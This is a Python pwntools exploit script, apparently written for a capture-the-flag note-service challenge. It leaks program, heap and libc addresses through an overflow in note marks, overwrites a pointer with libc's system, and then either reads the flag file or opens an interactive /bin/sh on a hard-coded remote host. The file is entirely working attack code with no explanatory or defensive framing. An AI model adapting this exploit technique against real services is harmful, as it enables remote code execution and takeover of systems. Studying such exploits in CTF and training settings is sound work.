from pwn import *
#context.log_level = 'debug'
import time

def new(p, size, name, content):
    p.recvuntil('$ ')
    p.sendline('new')
    p.recvuntil('note size:')
    p.sendline(str(size))
    p.recvuntil('note name:')
    p.sendline(name)
    p.recvuntil('note content:')
    p.sendline(content)

def mark(p, note_id, mark_info):
    p.recvuntil('$ ')
    p.sendline('mark')
    p.recvuntil('index of note you want to mark:')
    p.sendline(str(note_id))
    p.recvuntil('mark info:')
    p.send(mark_info)

def edit_mark(p, mark_id, mark_info):
    p.recvuntil('$ ')
    p.sendline('edit_mark')
    p.recvuntil('mark index:')
    p.sendline(str(mark_id))
    p.recvuntil('mark content:')
    p.send(mark_info)

def show_mark(p, mark_id):
    p.recvuntil('$ ')
    p.sendline('show_mark')
    p.recvuntil('mark index:')
    p.sendline(str(mark_id))

def pwn(ip, port):
    libc_offset = 0x070540
    system_offset = 0x431B0
    #libc_offset = 0x6f690
    #system_offset = 0x45390
    #p = process('./pwn25-bak')
    global pwn25_p
    p = remote(ip, port)
    #p.recvuntil = recvuntil
    #pwn25_p = p
    
    try:
        p.recvuntil('Your choice : ')
        p.sendline('1337')

        new(p, 1, '1', '1')
        mark(p, 0, 'aaaaaaaa\n')
        mark(p, 0, 'bbbbbbbb\n')

        new(p, 1, '123', '123')

        edit_mark(p, 0, 'a'*64)
        show_mark(p, 0)
        p.recvuntil('a'*64)
        program_base = u64(p.recv(6).ljust(8, '\x00')) - 0x11e6
        log.success(hex(program_base))

        payload = 'a'*56 + p64(program_base + 0x203040)
        edit_mark(p, 0, payload)
        show_mark(p, 1)
        heap_base = u64(p.recv(6).ljust(8, '\x00')) - 0x1080
        log.success(hex(heap_base))

        payload = 'a'*56 + p64(program_base + 0x202F40)
        edit_mark(p, 0, payload)
        show_mark(p, 1)
        libc_base = u64(p.recv(6).ljust(8, '\x00')) - libc_offset
        log.success(hex(libc_base))

        payload = 'echo fuck1 && cat flag'.ljust(56, '\x00') + p64(heap_base + 0x1090)
        edit_mark(p, 0, payload)

        payload = p64(libc_base + system_offset) + '\n'
        edit_mark(p, 1, payload)

        show_mark(p, 0)
        p.recvuntil('fuck1\n')
        flag = p.recvuntil('\n')[:-1]
    except:
        pass
    p.close()
    return flag
    

def shell(ip, port):
    global context
    context.log_level = 'debug'
    libc_offset = 0x070540
    system_offset = 0x431B0
    #libc_offset = 0x6f690
    #system_offset = 0x45390
    #p = process('./pwn25-bak')
    p = remote(ip, port)
    p.recvuntil('Your choice : ')
    p.sendline('1337')

    new(p, 1, '1', '1')
    mark(p, 0, 'aaaaaaaa\n')
    mark(p, 0, 'bbbbbbbb\n')

    new(p, 1, '123', '123')

    edit_mark(p, 0, 'a'*64)
    show_mark(p, 0)
    p.recvuntil('a'*64)
    program_base = u64(p.recv(6).ljust(8, '\x00')) - 0x11e6
    log.success(hex(program_base))

    payload = 'a'*56 + p64(program_base + 0x203040)
    edit_mark(p, 0, payload)
    show_mark(p, 1)
    heap_base = u64(p.recv(6).ljust(8, '\x00')) - 0x1080
    log.success(hex(heap_base))

    payload = 'a'*56 + p64(program_base + 0x202F40)
    edit_mark(p, 0, payload)
    show_mark(p, 1)
    libc_base = u64(p.recv(6).ljust(8, '\x00')) - libc_offset
    log.success(hex(libc_base))

    payload = '/bin/sh\x00'.ljust(56, '\x00') + p64(heap_base + 0x1090)
    edit_mark(p, 0, payload)

    payload = p64(libc_base + system_offset) + '\n'
    edit_mark(p, 1, payload)

    show_mark(p, 0)
    p.interactive()

if __name__ == '__main__':
    shell('172.16.5.14', 5070)